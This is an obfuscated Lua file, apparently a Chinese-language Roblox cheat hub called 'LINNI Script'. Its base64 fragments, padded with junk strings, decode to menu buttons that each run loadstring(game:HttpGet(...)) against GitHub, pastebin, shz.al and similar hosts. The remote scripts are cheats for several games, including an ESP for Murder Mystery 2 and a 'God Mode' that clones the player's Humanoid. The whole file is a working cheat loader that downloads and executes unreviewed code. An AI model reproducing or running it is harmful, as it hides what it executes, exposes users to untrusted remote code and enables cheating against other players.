auQoSRntnRVuCrvNQ('sEQiCsnWAmWeocCCJwzwvPQIIdLelsqXyutDrxoWESipeQyvRiHGuZTvMBAqfgtVXTviXJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/REDzHUB/BloxFruits/main/redz9999tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RaWEvhEiQSVjlrHSOktZkFuXOecdBlhqidctUQOPOAHizSwFtcFwXfTHYZQgFSNKFYCVjaKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('WuOKRNRyBzYQgYGrnpkavmHyyBQTRCVrvMSIRPepLPMbVEEWUXkThqvOSjDOwPhfMhJTByLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JgnZebTJotbwzABYbuXoJTkBjboezIISCvgQVCpvGJTaRPdhLNPxjapBgzXBtjSdoniEfVamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EVJEtgbIlosALlADbyBVJNQYuxtbXCJbEEpByBItdVMeNfqBTmwDlQShghQcKKMiyBEEYnamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RhuleOPmeFxpBYcjeLAsufFWyxXunvIMQPdigMfHrXyCYuQtsDwfiaRqWhlxlvbfhpasuJbG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('amuTZwkAiTAtsEfTAWeukvWZtsvrvLBJMHUfhnDLYkWxDPeYJfhWrUrOiOnARXjRixsYHUKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')进击的僵尸脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QMmyWkVmYojwQnjEmqPrDrlyBiUNiIbbTzFeHZBXSSDwpGtQPQaenmHLxrJuphzjDojrElLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IPoefXqZiEWzXdITfLtPpuwrnxqLopkrzMKjaGBdYrqmPNywVJGjhrrQhNFXJadWqCCbQbKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('cvmWXMFRmSpQhOJUAZOhHPGwoSObLBFKIVSGnfnknlcYFiOOXmvXSwDAJcxWssEkIEnHHLLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')进击的僵尸tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('IlaFBOOPexOyqaOLFDsRczktTFhqkcOaKggnPJUNWUFhYRJxDADPOcguTNAxHioiIxTpNJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~KSKSKSKtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PgZqSFWweXNizQMuDzlvIiJHHLtgHqxoWsMVpBEnQUkEWjQppMaVciqJzbHWTOvNMFenXJKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')破坏者谜团2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('JQSCiVUrqOYtinvUMSqmcyEmEwdciiyxJdCElNoXYimWXBadWSKnFkJgwwAvueoncBnkzkLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UfhBUhbkiMYQdgrIAReSMEyCibDuFbhvAtEkZVuWFOuPJSvRZPPPZyqQqRHjOWFawTsXNZKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dKbkyyJJxmKnJCHKZjFnByaxnHSrFEjSPnEAKBLJkIWZUEkqRXQWXFFICSuhHBUYibTkQULHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')破坏者谜团2（多功能）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SHQbqEVeERQwkZZXqLEmpoUpRTUzMiICTFYvRqonAATAUVIrGeEVCDvQvhqwCKkBCOuKoeLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/Ethanoj1/EclipseMM2/master/ScripttZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('THVgWklfhUQOqLjALlHDBMzDwRZVAsuXUBtPWXKGNSeTDAvhGhLPjFzeOuyxpxmkCcqoxtKSx0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')霖溺非常推荐（破坏者谜团2）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('RItxlEQpnmEEQchxZoPaLHdkkWwDdNwLrnSguqdeCPWaCfosjfXEYJGBDEUAcCCqCIAVIILGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~GHDtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AwhtUCKLBNgfmTweJvTEPuvqwbDlioveyBHbdVZVvwChtZzRKtAOOuquZyBULhNTzhdwnsKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')破坏者谜团2（老外的）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tPwfwsMFkaTSzNPFaIirLNxIasCzfujtHAjhFNWHVzGGzQLkRKQZrGLVlrOaHrvAvdBBePLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~GHDJJtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('HoJxHJWJVMcRiJnZZtXwdVYeoSAiyrcGaNNfFpOPAFqqJyJZxyErCGoFvDsjASnKmtMPhWKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')破坏者谜团2tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ASWEnUAkJomTwAeVDjKBoNwbjDiIrwDbqFfNOomOOBEHgvESFaddoBFHSbwTqEbjIbpleJLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6R2V0T2JqZWN0cyg=')rbxassetid://4001118261tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MEhngfWaULqAIpLuxOSJmWyHjNwjeGYofjgTVQyJTTMHpBtADLkLFgmdnLPdKhcPxReMaLKVsxXS5Tb3VyY2UpKCkNCmVuZCkNCiAgICBjcmVkaXRzOkJ1dHRvbig=')破坏者谜团（透视谁是警长）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tgwVumMZrUqggYPlKhaudUXWpVJtPtJkyFNCjeICslhDtMbhXVfMxmhdHmpyVQsUtgZsEfLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Ihaveash0rtnamefordiscord/Releases/main/MurderMystery2HighlightESPtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PvXkmFTgUforVDIrcEyHQBFuCFTBRqUpMheeFyqKYoTZNxrmaHIHSxLbPPfFjTrZvBXBwQKSko') Watermelon ?tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('PQqQKjtMhMrBarHoedTzoAQLiQlQDwLuRXOMamcMbTwUewtLlstHnqiGyksnPxXfNUVUYwKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')nico下一个机器人脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uFxoUfNkPZNhVYpgIsLmCEkSSvYDyxBCcHEgstzyOiMfzogbfRZJXfVwjYuANNkZnpPnNULA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dMUqpqRjnClHqexCsHfEiFGgESApRBlByxNIstfsvgNcKPdSasNAmwTVspXlVbawpxumvUKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vVjfhUHYmvCeMuCvzdgpasXUBhuJjfsLaVCrFiUOSBqefELUgGLrpkttxgIfDbxSNLpJbGLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')nico下一个机器人tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MidsGGXdFpADLasnBZDPAnkAVwtsZGSwVHfmzhAVjrIlsQfqBiUUuAZQThuvWLfQnFFAxMLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/elonof/nicosbots-script/main/main.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rHJunIgNNXsyatqLgOzkdiywJOFBoCpMeGeZQshFDhUhSJHPZoxXLKJJvDKioIEKlqnYmaLHRydWUpKSgpDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')nico下一个机器人tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('jfKfFQNbNkGOIIZLpNbQyNAdvuqubOlmUFkfMjXINehlAIgksaAenmYMRwfizjIUDlQMHvLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://fern.wtf/scripts/nico_bot.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qGYPLgtiFQBuPLNNpaNoXKamBUFJWIHOELTlxmQXQoAFCXgySzzTTSdqtXKzzFoCKuBQIiLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')nico下一个机器人tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('FZywUQstgMiGaEzHzPojpBvBdBmWwYumXNNzGNsdfxhMTnOyCrNdBlFTmmEhnrvogCiXZBLGZ1bmN0aW9uKCkNCiAgICBsb2NhbCBocnAgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKA==')HumanoidtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vFRGivDUXBRnLORYrbyAPTRjijWQsmRkubjqMrAHTBqwICznlieHAyiWzOEUUfFzLNkAoxKQ0KaHJwLlBhcmVudCA9IG5pbA0KaHJwOkNsb25lKCkNCmhycC5QYXJlbnQgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyDQpocnAuTmFtZSA9IA==')HumanoidtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('rlCgAxVTasAUXBdBBAebCWXEJdiwInwmUwuHodjdiBnFXBYcsDMrehQxTTCPFyWUxlONCjDQpnYW1lLlN0YXJ0ZXJHdWk6U2V0Q29yZSg=')SendNotificationtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('XlVUckIKNgTlbcHXgmgBvhOqUcBykYJtbPjZuNLOTXvlAfWNHALhrsNxwZWOgLapjjHSMULCB7VGl0bGU9')God ModetZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YQEDWRQzisKQfCmNarzJTDCbEdhYZkaDbxyTtnrXuavOxCfJthBbpWoEujwOhvOSmujjonOyBUZXh0PQ==')God Mode ActivatedtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fQxXsflTEocrvoyZfVztEgIGPLfxGLNCPYmGpCgmcvOJWqYmdWZKVfxxQRzHTUHqHewOOnOyBEdXJhdGlvbj01O30pDQplbmQpDQogICAgY3JlZGl0czpCdXR0b24o')nico下一个机器人tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AEuQjibBWAowCLrxBlBsTkosRwkWtuGGKbAYEUpbgHFimvrksPHyEEHbhJDMkGKzfRcISTLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldEFzeW5jKA==')https://raw.githubusercontent.com/fartbutt69/Nico-s-Nextbot-Killer/main/script.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('LLhOJNCAbRWDFlZMpauRCspijcmpEcERQqqOEmuBymAtwcewWXAHbhwwKagLJooSAXtbIOLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')nico下一个机器人tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('nDxAButPyzMePiAWFzakIdkXFtASNZRJPnOjsLnTyYDTVPXfZHoxjcbqWOmymGUaxdhAUSLGZ1bmN0aW9uKCkNCiAgICBsb2NhbCBQbGF5ZXIgPSBnYW1lOkdldFNlcnZpY2Uo')PlayerstZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('onKPgCqFXYOJOBlmvvRdonoGBfySflPezjiGRwVTbZXmwuOWbjMBIYetZCAHoUYBwJISehKS5Mb2NhbFBsYXllcg0KDQp3aGlsZSB0cnVlIGRvIA0Kd2FpdCgwLjUpDQpQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuUG9zaXRpb24gPSBWZWN0b3IzLm5ldygwLCAtNTAsIDApDQp3YWl0KDAuNSkNClBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5Qb3NpdGlvbiA9IFZlY3RvcjMubmV3KDAsIC04MCwgMCkNCmVuZA0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')蜂群模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZNfIxXXiDOjTEyUnZamZATXPXqDkOmxtJNOLLvXMFkAxVcPdNxJmLBJtmHcHEUUbapMBnQLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tvuRqSMqinuNlhrSWtKvfDWBzuuCShYHyXwQtEAltRmFBpLyKlPqzRfsIqDXXOVscuDZQDKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('eHDztrGdUVDWVzlPcUweDfgSgNUgxgpKkjVGbKnSxXqGTGgkhnENfsokGfyuRgyLgzfdeuLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')霖溺简易汉化tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vwvjQBSdrFDUHoWNIzUNMxnTYBytvbFdrlmZTJPGyRehbjHSfBBGrrUJdOyNeBfoZxkxqBLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAKKJAtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kjeQuxsjmupSRqjGlNVlsEOJrwWqxNqhmoHJcHiXkylmWXyVbPTIvgvAXsgrSqbhgxRmRoKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')蜂群模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('fQnLiYaJkyKBQcRLDztdWuvJDjRbdClaWUXYTHJafcAlaUgTEdZhoMdyzqoSsaFaXuUVklLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://shz.al/~HHAKKSStZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('BFfgcwajGsClcRPjgnTGoxavpizDrPinTwsIHvkybJhuzxvubrYUoedtwGYsEicqmTQGHdKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')蜂群模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('wyNspwAdHxQZqlZwXnBJwEVAyrWrsHsSaENBYsvFMCOkvEPYjHzGhvCCdVYjSlRCPwFPDuLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastebin.com/raw/3A61hnGAtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gSLzNeiBIIpRrOYIVJQlWBqESELcdFbWOKFCyNFEmGtAiIfQkaGMblOPtDCKKbZeQocQlDLCB0cnVlKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')蜂群模拟器bee swarmtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('KtmFbGlZPYWJEXhHvmUfyGuazXdyUAzXhcelxfwigGQRjVJyVTiIRewFIeNKPPjaLrTgNDLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/Historia00012/HISTORIAHUB/main/BSS%20FREEtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('YnQmYvnqBkPJEUsTcaiFvenSVauAEtCeZpuregqioLXcttwihDpRqVOysrzugkhmyIpKgOKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')蜂群模拟器（名字相同脚本不同）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('ZpuSUbzFHSLaQRbIjjGZbdZOLJpCIeYGSDBiWyceJJldkPzIUkQGORnYXdtGLONhqqXlxELGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://pastefy.app/QtYmKaQ1/rawtZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('kAIxPRvXyyHlfWpzfwrNCNlAgwMYkCjezLeiMouBCXyLQllPVMAwWtTwaeQmitZLWDwhnKKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')蜂群模拟器（自动收集）tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('mQhkvvCqflHLmWuPphNcBNyvVdqeEGDlrJsGbLrFyBchFdASFLmaoxRkewpNBTXNkFFUQYLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/max0mind/lua/main/loader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('dlZWuhtjoCipuWdrCdykwlJLDvpFFdfUjbISoicmmklSkWLgjbYIcbiFUfxKTUjnqtGGhyKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')剑客脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('uScVJGebOiYJJMyjoVrgpTnLfmwyhVpzwoXENRwFRJoklKfvBgptMwuzZtcpmWSwTaWpRkLGZ1bmN0aW9uKCkNCiAgICBqaWFua2VfVjQgPSA=')作者_初夏tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('euiHpGtAZzoOxtyRGLrsrXKsVmGlkWmmqwVERNSguXwOIKFOVqLyItgWMeYEGhBIfJbPRSamlhbmtlX19WNCA9IA==')作者QQ1412152634tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('gAOHkbFmBcDEzMxvYfKEEUcTqzxvfxzNVmpLoIpjZyGxBUuPawFeJxyajIRcBYApgVkqTQamlhbmtlX19fVjQgPSA=')剑客QQ群347724155tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('xVqkJuFwmotcrdpWYnIHqXobSwxAIEPkpjhnPNlxQqbAyZUkoSVOMHhvOSuuDEnGONscRybG9hZHN0cmluZyhnYW1lOkh0dHBHZXQoKA==')https://shz.al/~JianKeV4tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('CWLpLJAQtTZhwNJHAiNgSfrFqafdDCCFvKGFDOcdHgHpHTpGeHZiAuudwlswUKGbljShGRKSkpKCkNCmVuZCkNCg0KbG9jYWwgY3JlZHMgPSB3aW5kb3c6VGFiKA==')小偷模拟器脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('qVQLGPwXbTyBPGrwXSuiGqVJwfoeCkZHEOfIgoiVNKJbGMNvCSDmeJHVVTMriyEvKKQcphLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('UsKPMOWVJCrFvcOnqKotTpmJnprrBtzcMzNlRMKyZQIOnklDSpBsStaQNXRslvIyTWeByzKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')『LINNI Script』tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('AJWLbmbGzlRMXgGqrCqkDZSwKuCSjPczrXQSVirjlZMcDvVnyUWkjYwLacOUyPUcaNGWGYLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')小偷模拟器tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('MSnrdjSakCDmzvBJhINDuNhtjLqayFkHcDfqJJItpLANBmDXXNkKZLrkonSzQNVgGsyzXoLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgo')https://raw.githubusercontent.com/adrician/Thief-Simulator---GUI/main/Thief%20sim.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('QIQlflIvuiszreFHRipWPIhYKpEDKdWDhIbhBCUYRLcEuKHRegFulXsHEKaPkvPHlYcZwqKSx0cnVlKSkoKQ0KZW5kKQ0KDQpsb2NhbCBjcmVkcyA9IHdpbmRvdzpUYWIo')evade大逃脱tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('SwjkVTQBzALPZHJkBHeePXzCECVUWcVgqozKRFDwJhQVxKqYutUGxlBiNaGWtabJOOrVOSLA==')16060333448tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('NfJivCJybTgtCYlnnQWjZVEcZlXhQtAEBZtDilzVhdkAJppmuAfVfpTUSQTGKBYtJZilAqKQ0KDQpsb2NhbCBjcmVkaXRzID0gY3JlZHM6c2VjdGlvbig=')evade脚本tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('tKYqlNqCoTWseREaYdRPjenlVLmvmiheaiHNRyTpPizpqwNOsnwDDLtQNbMCzImdJVayixLHRydWUpDQogICAgY3JlZGl0czpCdXR0b24o')evade脚本1tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('vnwYQWyGxMFBlrMzrCFIWafOMtCfGomnAPmFkqeMXilOoRJIvNUKqRzaSbCmLpzffdLPdvLGZ1bmN0aW9uKCkNCiAgICBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCg=')https://raw.githubusercontent.com/PepesGH1/stuff/main/evadeloader.luatZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebuSgxoTToXgmntuFtEoCUKXXauQoSRntnRVuCrvNQ('EwxFDxJEOJBpJCsVbvIETPcHjmZYPUtwEBRfRHxcqlTLnkVUkluMrbXxjLovVOxNYagtTDKSkoKQ0KZW5kKQ0KICAgIGNyZWRpdHM6QnV0dG9uKA==')evade大逃脱tZzOcFyAhpKFniQnEqyDpxfPdJCqpyGvNNhuiZrchSzebu